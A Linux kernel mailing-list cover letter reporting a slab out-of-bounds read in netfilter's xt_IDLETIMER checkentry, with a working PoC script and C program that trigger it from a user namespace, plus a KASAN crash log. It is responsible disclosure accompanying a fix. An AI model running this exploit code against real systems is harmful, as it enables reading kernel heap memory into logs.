Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BCB2D199920
	for <netfilter-devel@vger.kernel.org>; Tue, 18 Aug 2026 01:56:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787018208; cv=none; b=bepqvaP0ZKsUzSYhfRmn3NXutQgqDNuaOIbtfkzvw1TStBbeywMAPlpbbYP9SafgmsRvdcR/TqcpQ0vD8DNJArOf1ecjEfHJQLXet3S8LSqSeq9zHv44qxc6oZGLVWAf5RtVpa5qAVLQiKChKHJDesNNL2FBuX7gYQ+V6eRoKfQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787018208; c=relaxed/simple;
	bh=RoZrUhlfpXtAjN/s1/pcuiHBjO5L5zvIo5Pj+4n/VIU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ap6/VM3LJJwlKVFO8k4xhmm40zYzN5jsTeRlKawBq2hJgOfA/q4swJLQBFulnFUMbqGH/k/qgzdtY/4AZbc8c9tH2J7DySOdlqTuGrCnQkdCPk+/XzCgLD/NW3K2Vfqz+/bM0O/mx0N89pw3ig011JI+ZguUBdWtxsTrVt95AdY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Zgd9tFed; arc=none smtp.client-ip=209.85.214.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Zgd9tFed"
Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2cace91f112so47620695ad.0
        for <netfilter-devel@vger.kernel.org>; Mon, 17 Aug 2026 18:56:45 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787018205; x=1787623005; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=WUX0pf8G9oGF83CwtHMA3Tu3PPIPHB5KfGwfuX7fnbY=;
        b=Zgd9tFed4k/NIqYKbxVa7OuAyz+5XlyBruoH173vIWn1c7gVrIz85FPyTV39CLH2yO
         wg8Uh1i1oQlFYgC8muIPOarwXu8nmt7qfWqOpXb6oJTscMS8QSTgdpcOItRo/FLNgayp
         P6JfEV7SZ6/vOPDUmgvSD6+EMdt5IZ2AAOiQOYkki6oY1XW8VsXawdR2MaLsiM1Oq54u
         TjrIJQJSGmpJ62nWXxe1plgETyzRg4sThWT6lWEXQp836NVThHDDSLowq7TmYsDeB9JK
         amDMs6GTNZe9sfG8hudZYphp24DcObeypbVCgNJDRGoOUMeF452+bUJCt7JmAAsqLDey
         sAOA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787018205; x=1787623005;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=WUX0pf8G9oGF83CwtHMA3Tu3PPIPHB5KfGwfuX7fnbY=;
        b=lkeuRPqgtzaJujct4j4LzSKdCKRKHcA5mksNI8G8OQHZLw4baqdaQ8CUQRCM82ss0k
         Sm9NpuHq3oL+UW6m1g9Wt3cQNZh8bQRjnVx2vCNS1t4qmDzuO3l9pbm90VkeOtVeNOJC
         z8Mp2bHoklmaCR33ZwYU91pl80JJ0GriI9bR6eIwMHjqcJioZ2PUAVSFlRlAlRcgvoRV
         yqS0bVsTM4XS5FjHj2k4BTUckrpu34M0TnFlQUkpL6lfPcqXOi6u7jzp5LJMgzA45H08
         jYWhyklNpsPp/itpAhiwX/fBTRr+hnMQ2NXMmuxl5RKnUg5F2aHTR8V/wZhQeEVHql9X
         UlPg==
X-Gm-Message-State: AOJu0Yxn0Z5pO3PF8uw6rgf9ccCYOU+8lOXkC1tu54iXUOB8dFBrW6SE
	AmGbmIoluK8khcH9AvLFhHuv5trsfHM8nLikENgze9DFLWsSWoQir8gDbdcJHAPawROcBJsQW2v
	5BadORQ==
X-Gm-Gg: AR+sD11E3LWXDdlXRR75uAG4SmJ+EUI8LkEOsK46BCr+NOdor/BN8XawhjzLlC2o1s5
	Z1UTqDCoDarGBlr++cxPQcqkKgkZaU2CMIJgG6/0UkY8qDtwbgiyaEhgauEFQ87OAapGe2Gmz2E
	JC7vXPNQKPZeJJ0F8bIOXCJ9LB50PNb6YLsui3Fx3Y+fm/Xg7qO1jjoDrx2Fhtov8GbhACA9yl2
	UkRFK9/FJ/0BVjT659hDrxRztfg9aEItZjL2URm3uyaWqxmrbPWutFPYPnucSAs0iggPUGMje8J
	E48yVJ3O7t0UZHfBS7Uf/n9+uNPwbKHGyE3ebk5WzFgcFQhqOfWJ0tNKJayXADbUgGPdZY2f2pM
	LXOQ+K70XpB/TxNyyPhogZhNdy+LCQ6N2aJjfcOdunwpqdFgKCIlXeA3Ffs9rWnLrcmjfjK0/kZ
	Gq9kFgOWQU+5nmeWILaIRxuCAphCAEYw7YB8FwfFuuFwB+JItYRSF8yiN7/jhzAtqEgICsJVXFs
	j3EVytW
X-Received: by 2002:a05:6a21:101:b0:3c4:3321:4fe9 with SMTP id adf61e73a8af0-3cc71d54187mr36615814637.7.1787018204815;
        Mon, 17 Aug 2026 18:56:44 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1415315900csm10913110c88.11.2026.08.17.18.56.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 17 Aug 2026 18:56:44 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	luciano.coelho@nokia.com,
	kaber@trash.net,
	quic_manojbm@quicinc.com,
	quic_subashab@quicinc.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: xt_IDLETIMER: fix out-of-bounds heap read in checkentry
Date: Tue, 18 Aug 2026 09:56:47 +0800
Message-ID: <cover.1786933680.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/xt_IDLETIMER.c. The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

Both `idletimer_tg_checkentry()` and `idletimer_tg_checkentry_v1()` in `net/netfilter/xt_IDLETIMER.c` invoke `pr_debug("checkentry targinfo%s\n", info->label)` before `idletimer_tg_helper()` validates whether the 28-byte user-controlled `info->label` buffer is properly NUL-terminated.

When an unprivileged user creates a user + network namespace (`unshare -Urn`), they obtain namespaced `CAP_NET_ADMIN` and can invoke `setsockopt(..., IPT_SO_SET_REPLACE, ...)` with a custom `label` containing no NUL byte.

When dynamic debugging is enabled (or in kernels built with DEBUG), `pr_debug()` formats the string via `vsnprintf()` -> `string()`, which scans past the end of the allocated target structure until it encounters a zero byte. This results in a slab-out-of-bounds heap read (detectable by KASAN) and potential information disclosure through kernel logs.

Reproducer:

    chmod +x poc.sh
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$dir"

echo 0 > /proc/sys/kernel/panic_on_warn
echo 8 > /proc/sys/kernel/printk
echo 'file net/netfilter/xt_IDLETIMER.c +p' > /proc/dynamic_debug/control

make clean >/dev/null 2>&1 || true
make
./poc


------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE
#include <errno.h>
#include <linux/netfilter.h>
#include <linux/netfilter/xt_IDLETIMER.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

struct ipt_standard {
	struct ipt_entry entry;
	struct xt_standard_target target;
};

struct idletimer_payload_v0 {
	struct xt_entry_target target;
	struct idletimer_tg_info info;
};

struct idletimer_rule_v0 {
	struct ipt_entry entry;
	struct idletimer_payload_v0 payload;
};

static void init_standard_accept(struct ipt_standard *rule)
{
	memset(rule, 0, sizeof(*rule));
	rule->entry.target_offset = sizeof(rule->entry);
	rule->entry.next_offset = sizeof(*rule);
	rule->target.target.u.user.target_size = XT_ALIGN(sizeof(rule->target));
	rule->target.verdict = -NF_ACCEPT - 1;
}

static void init_malicious_rule(struct idletimer_rule_v0 *rule)
{
	memset(rule, 0, sizeof(*rule));
	rule->entry.target_offset = sizeof(rule->entry);
	rule->entry.next_offset = sizeof(*rule);
	rule->payload.target.u.user.target_size =
		XT_ALIGN(sizeof(rule->payload));
	strncpy(rule->payload.target.u.user.name, "IDLETIMER",
		sizeof(rule->payload.target.u.user.name));
	rule->payload.info.timeout = 1;
	memset(rule->payload.info.label, 'A', sizeof(rule->payload.info.label));
	memset(&rule->payload.info.timer, 'B', sizeof(rule->payload.info.timer));
}

static int get_filter_info(int fd, struct ipt_getinfo *info)
{
	socklen_t len = sizeof(*info);

	memset(info, 0, sizeof(*info));
	strncpy(info->name, "filter", sizeof(info->name) - 1);

	if (getsockopt(fd, IPPROTO_IP, IPT_SO_GET_INFO, info, &len) < 0)
		return -1;

	return 0;
}

int main(void)
{
	struct ipt_getinfo info;
	struct ipt_replace *repl;
	struct ipt_standard *input;
	struct ipt_standard *forward;
	struct ipt_standard *output;
	struct idletimer_rule_v0 *bug;
	size_t payload_size;
	size_t total_len;
	char *cursor;
	int fd;
	int ret;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	if (get_filter_info(fd, &info) < 0) {
		perror("getsockopt(IPT_SO_GET_INFO)");
		close(fd);
		return 1;
	}

	payload_size = sizeof(*input) + sizeof(*forward) + sizeof(*output) +
		       sizeof(*bug);
	total_len = sizeof(*repl) + payload_size;
	repl = calloc(1, total_len);
	if (!repl) {
		perror("calloc");
		close(fd);
		return 1;
	}

	strncpy(repl->name, "filter", sizeof(repl->name) - 1);
	repl->valid_hooks = info.valid_hooks;
	repl->num_entries = 4;
	repl->size = payload_size;
	repl->num_counters = info.num_entries;

	cursor = (char *)repl->entries;
	input = (struct ipt_standard *)cursor;
	init_standard_accept(input);
	repl->hook_entry[NF_INET_LOCAL_IN] = cursor - (char *)repl->entries;
	repl->underflow[NF_INET_LOCAL_IN] = cursor - (char *)repl->entries;

	cursor += sizeof(*input);
	forward = (struct ipt_standard *)cursor;
	init_standard_accept(forward);
	repl->hook_entry[NF_INET_FORWARD] = cursor - (char *)repl->entries;
	repl->underflow[NF_INET_FORWARD] = cursor - (char *)repl->entries;

	cursor += sizeof(*forward);
	output = (struct ipt_standard *)cursor;
	init_standard_accept(output);
	repl->hook_entry[NF_INET_LOCAL_OUT] = cursor - (char *)repl->entries;
	repl->underflow[NF_INET_LOCAL_OUT] = cursor - (char *)repl->entries;

	cursor += sizeof(*output);
	bug = (struct idletimer_rule_v0 *)cursor;
	init_malicious_rule(bug);

	printf("table valid_hooks=0x%x old_num_entries=%u new_size=%u\n",
	       info.valid_hooks, info.num_entries, repl->size);
	printf("malicious label bytes=%zu timer bytes=%zu\n",
	       sizeof(bug->payload.info.label), sizeof(bug->payload.info.timer));
	fflush(stdout);

	ret = setsockopt(fd, IPPROTO_IP, IPT_SO_SET_REPLACE, repl, total_len);
	if (ret < 0)
		perror("setsockopt(IPT_SO_SET_REPLACE)");
	else
		puts("setsockopt(IPT_SO_SET_REPLACE) unexpectedly succeeded");

	free(repl);
	close(fd);
	return ret < 0 ? 0 : 1;
}


------END poc.c--------

----BEGIN crash log----

[  586.594104][ T9476] ===============================================
label bytes=28 t[  586.594924][ T9476] BUG: KASAN: slab-out-of-bounds in string0
imer bytes=8
[  586.595763][ T9476] Read of size 1 at addr ffff8880383d4ac0 by task poc/9476
[  586.596619][ T9476] 
[  586.596947][ T9476] CPU: 1 UID: 0 PID: 9476 Comm: poc Not tainted 7.0.0-rc6- 
[  586.596955][ T9476] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  586.596971][ T9476] Call Trace:
[  586.596983][ T9476]  <TASK>
[  586.596986][ T9476]  dump_stack_lvl+0x10e/0x1f0
[  586.597025][ T9476]  print_report+0xf7/0x600
[  586.597086][ T9476]  ? preempt_count_sub+0x13/0xd0
[  586.597130][ T9476]  ? __virt_addr_valid+0x1ab/0x330
[  586.597180][ T9476]  ? __phys_addr+0x41/0x90
[  586.597188][ T9476]  ? string+0x177/0x340
[  586.597194][ T9476]  kasan_report+0xe4/0x120
[  586.597213][ T9476]  ? string+0x177/0x340
[  586.597220][ T9476]  string+0x177/0x340
[  586.597227][ T9476]  ? __pfx_string+0x10/0x10
[  586.597233][ T9476]  ? lock_release+0x225/0x2f0
[  586.597254][ T9476]  vsnprintf+0x2c2/0xb20
[  586.597266][ T9476]  ? __pfx_vsnprintf+0x10/0x10
[  586.597272][ T9476]  ? unwind_next_frame+0x269/0x10a0
[  586.597285][ T9476]  va_format+0x17b/0x340
[  586.597292][ T9476]  ? lock_release+0x1ba/0x2f0
[  586.597297][ T9476]  ? __rcu_read_unlock+0x4b/0x340
[  586.597321][ T9476]  ? __pfx_va_format+0x10/0x10
[  586.597328][ T9476]  ? is_bpf_text_address+0x94/0x1a0
[  586.597361][ T9476]  ? unwind_get_return_address+0x32/0x50
[  586.597368][ T9476]  ? rcu_is_watching+0x3d/0x80
[  586.597380][ T9476]  pointer+0x6d2/0xa50
[  586.597386][ T9476]  ? format_decode+0x2ef/0x760
[  586.597391][ T9476]  ? __pfx_pointer+0x10/0x10
[  586.597397][ T9476]  ? is_bpf_text_address+0x8a/0x1a0
[  586.597404][ T9476]  ? rcu_is_watching+0x3d/0x80
[  586.597411][ T9476]  vsnprintf+0x794/0xb20
[  586.597418][ T9476]  ? __pfx_vsnprintf+0x10/0x10
[  586.597424][ T9476]  ? __rcu_read_unlock+0x4b/0x340
[  586.597430][ T9476]  vprintk_store+0x35c/0x9c0
[  586.597445][ T9476]  ? arch_stack_walk+0xa6/0xf0
[  586.597462][ T9476]  ? __pfx_vprintk_store+0x10/0x10
[  586.597470][ T9476]  ? stack_trace_save+0x8e/0xc0
[  586.597485][ T9476]  ? stack_depot_save_flags+0x29/0x990
[  586.597540][ T9476]  ? is_printk_cpu_sync_owner+0x32/0x40
[  586.597548][ T9476]  vprintk_emit+0x123/0x670
[  586.597555][ T9476]  ? __pfx_vprintk_emit+0x10/0x10
[  586.597562][ T9476]  ? is_bpf_text_address+0x8a/0x1a0
[  586.597568][ T9476]  ? rcu_is_watching+0x3d/0x80
[  586.597575][ T9476]  ? pcpu_next_md_free_region+0x99/0x220
[  586.597614][ T9476]  _printk+0xc7/0x100
[  586.597620][ T9476]  ? __pfx__printk+0x10/0x10
[  586.597626][ T9476]  ? lock_acquire+0x303/0x360
[  586.597631][ T9476]  ? rcu_is_watching+0x3d/0x80
[  586.597639][ T9476]  __dynamic_pr_debug+0x1f4/0x260
[  586.597654][ T9476]  ? __pfx___dynamic_pr_debug+0x10/0x10
[  586.597661][ T9476]  ? rcu_is_watching+0x3d/0x80
[  586.597668][ T9476]  ? __pfx___mutex_lock+0x10/0x10
[  586.597682][ T9476]  ? xt_check_target_common+0x1c8/0x670
[  586.597732][ T9476]  ? idletimer_tg_checkentry+0x1d/0x700
[  586.597753][ T9476]  idletimer_tg_checkentry+0x1fc/0x700
[  586.597768][ T9476]  ? __pfx_idletimer_tg_checkentry+0x10/0x10
[  586.597779][ T9476]  xt_check_target+0xb8/0x100
[  586.597787][ T9476]  find_check_entry.isra.0+0x56c/0x5d0
[  586.597824][ T9476]  ? __pfx_find_check_entry.isra.0+0x10/0x10
[  586.597831][ T9476]  ? trace_irq_enable.constprop.0+0xfd/0x120
[  586.597853][ T9476]  ? kfree+0x2e2/0x6c0
[  586.597861][ T9476]  ? translate_table+0x766/0xce0
[  586.597868][ T9476]  ? xt_check_table_hooks+0x1bf/0x2e0
[  586.597874][ T9476]  translate_table+0x7e3/0xce0
[  586.597881][ T9476]  ? __pfx_translate_table+0x10/0x10
[  586.597888][ T9476]  do_ipt_set_ctl+0x3fd/0x9a0
[  586.597895][ T9476]  ? __pfx_do_ipt_set_ctl+0x10/0x10
[  586.597907][ T9476]  ? preempt_count_sub+0x13/0xd0
[  586.597913][ T9476]  ? __mutex_unlock_slowpath+0x2a2/0x640
[  586.597920][ T9476]  ? sockopt_release_sock+0x40/0x50
[  586.597944][ T9476]  ? __pfx___mutex_unlock_slowpath+0x10/0x10
[  586.597953][ T9476]  nf_setsockopt+0x7b/0xc0
[  586.597970][ T9476]  ip_setsockopt+0xcb/0xf0
[  586.597994][ T9476]  tcp_setsockopt+0x83/0xd0
[  586.598009][ T9476]  ? __pfx_sock_common_setsockopt+0x10/0x10
[  586.598020][ T9476]  do_sock_setsockopt+0xc3/0x170
[  586.598031][ T9476]  __sys_setsockopt+0x122/0x180
[  586.598037][ T9476]  __x64_sys_setsockopt+0x64/0x80
[  586.598042][ T9476]  do_syscall_64+0x116/0x800
[  586.598050][ T9476]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  586.598066][ T9476] RIP: 0033:0x7f7e1c3850fa
[  586.598086][ T9476] Code: ff ff ff c3 0f 1f 40 00 48 8b 15 91 0d 0d 00 f7 d88
[  586.598092][ T9476] RSP: 002b:00007fff020d1e88 EFLAGS: 00000206 ORIG_RAX: 006
[  586.598106][ T9476] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f7a
[  586.598109][ T9476] RDX: 0000000000000040 RSI: 0000000000000000 RDI: 00000003
[  586.598112][ T9476] RBP: 00005576744652a0 R08: 00000000000002e0 R09: 00007ff7
[  586.598116][ T9476] R10: 00005576744652a0 R11: 0000000000000206 R12: 00000003
[  586.598119][ T9476] R13: 0000000000000000 R14: 0000000000000000 R15: 00000000
[  586.598124][ T9476]  </TASK>
[  586.598126][ T9476] 
[  586.646461][ T9476] Allocated by task 9476:
[  586.646897][ T9476]  kasan_save_stack+0x33/0x60
[  586.647409][ T9476]  kasan_save_track+0x14/0x30
[  586.648016][ T9476]  __kasan_kmalloc+0xaa/0xb0
[  586.648505][ T9476]  __kvmalloc_node_noprof+0x394/0x9a0
[  586.649081][ T9476]  xt_alloc_table_info+0x44/0x80
[  586.649607][ T9476]  do_ipt_set_ctl+0x38a/0x9a0
[  586.650115][ T9476]  nf_setsockopt+0x7b/0xc0
[  586.650597][ T9476]  ip_setsockopt+0xcb/0xf0
[  586.651074][ T9476]  tcp_setsockopt+0x83/0xd0
[  586.651565][ T9476]  do_sock_setsockopt+0xc3/0x170
[  586.652106][ T9476]  __sys_setsockopt+0x122/0x180
[  586.652623][ T9476]  __x64_sys_setsockopt+0x64/0x80
[  586.653104][ T9476]  do_syscall_64+0x116/0x800
[  586.653561][ T9476]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  586.654175][ T9476] 
[  586.654412][ T9476] The buggy address belongs to the object at ffff8880383d40
[  586.654412][ T9476]  which belongs to the cache kmalloc-cg-1k of size 1024
[  586.655785][ T9476] The buggy address is located 0 bytes to the right of
[  586.655785][ T9476]  allocated 704-byte region [ffff8880383d4800, ffff888038)
[  586.657192][ T9476] 
[  586.657417][ T9476] The buggy address belongs to the physical page:
[  586.658154][ T9476] page: refcount:0 mapcount:0 mapping:0000000000000000 ind0
[  586.659181][ T9476] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[  586.660035][ T9476] memcg:ffff8880383d0411
[  586.660463][ T9476] flags: 0xfff00000000240(workingset|head|node=0|zone=1|la)
[  586.661339][ T9476] page_type: f5(slab)
[  586.661715][ T9476] raw: 00fff00000000240 ffff88801785d280 ffff88801785c648 0
[  586.662552][ T9476] raw: ffff8880383d7000 000008000010000f 00000000f5000000 1
[  586.663607][ T9476] head: 00fff00000000240 ffff88801785d280 ffff88801785c6480
[  586.664452][ T9476] head: ffff8880383d7000 000008000010000f 00000000f50000001
[  586.665341][ T9476] head: 00fff00000000003 fffffffffffffe01 00000000fffffffff
[  586.666235][ T9476] head: ffffffffffffffff 0000000000000000 00000000ffffffff8
[  586.667122][ T9476] page dumped because: kasan: bad access detected
[  586.667801][ T9476] page_owner tracks the page as allocated
[  586.668367][ T9476] page last allocated via order 3, migratetype Unmovable, 4
[  586.670332][ T9476]  post_alloc_hook+0xe6/0x100
[  586.670835][ T9476]  get_page_from_freelist+0x55c/0x2210
[  586.671357][ T9476]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[  586.671957][ T9476]  new_slab+0xa2/0x5f0
[  586.672359][ T9476]  refill_objects+0xe3/0x430
[  586.672836][ T9476]  __pcs_replace_empty_main+0x2ed/0x650
[  586.673409][ T9476]  __kmalloc_node_track_caller_noprof+0x68e/0x860
[  586.673987][ T9476]  kmalloc_reserve+0xa4/0x1f0
[  586.674456][ T9476]  __alloc_skb+0x172/0x470
[  586.674923][ T9476]  alloc_skb_with_frags+0x9f/0x4c0
[  586.675430][ T9476]  sock_alloc_send_pskb+0x5eb/0x630
[  586.675940][ T9476]  unix_stream_sendmsg+0x2dd/0xd60
[  586.676514][ T9476]  ____sys_sendmsg+0x78e/0x7c0
[  586.677008][ T9476]  ___sys_sendmsg+0x129/0x1b0
[  586.677457][ T9476]  __sys_sendmsg+0x133/0x1d0
[  586.677937][ T9476]  do_syscall_64+0x116/0x800
[  586.678462][ T9476] page last free pid 1 tgid 1 stack trace:
[  586.679111][ T9476]  __free_frozen_pages+0x52d/0x960
[  586.679675][ T9476]  qlist_free_all+0x47/0xf0
[  586.680161][ T9476]  kasan_quarantine_reduce+0x195/0x1e0
[  586.680709][ T9476]  __kasan_slab_alloc+0x69/0x90
[  586.681194][ T9476]  kmem_cache_alloc_noprof+0x23a/0x6d0
[  586.681747][ T9476]  do_getname+0x35/0x290
[  586.682209][ T9476]  __do_sys_newstat+0x8a/0x130
[  586.682706][ T9476]  do_syscall_64+0x116/0x800
[  586.683147][ T9476]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  586.683722][ T9476] 
[  586.683961][ T9476] Memory state around the buggy address:
[  586.684521][ T9476]  ffff8880383d4980: 00 00 00 00 00 00 00 00 00 00 00 00 00
[  586.685316][ T9476]  ffff8880383d4a00: 00 00 00 00 00 00 00 00 00 00 00 00 00
[  586.686141][ T9476] >ffff8880383d4a80: 00 00 00 00 00 00 00 00 fc fc fc fc fc
[  586.686925][ T9476]                                            ^
[  586.687531][ T9476]  ffff8880383d4b00: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  586.688368][ T9476]  ffff8880383d4b80: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  586.689176][ T9476] =========================================================


-----END crash log-----

Best regards,
Luxiao Xu <rakukuip@gmail.com>
Ren Wei <n05ec@lzu.edu.cn>

Luxiao Xu (1):
  netfilter: xt_IDLETIMER: validate label before debug logging in
    checkentry

 net/netfilter/xt_IDLETIMER.c | 9 +++++----
 1 file changed, 5 insertions(+), 4 deletions(-)

-- 
2.43.0
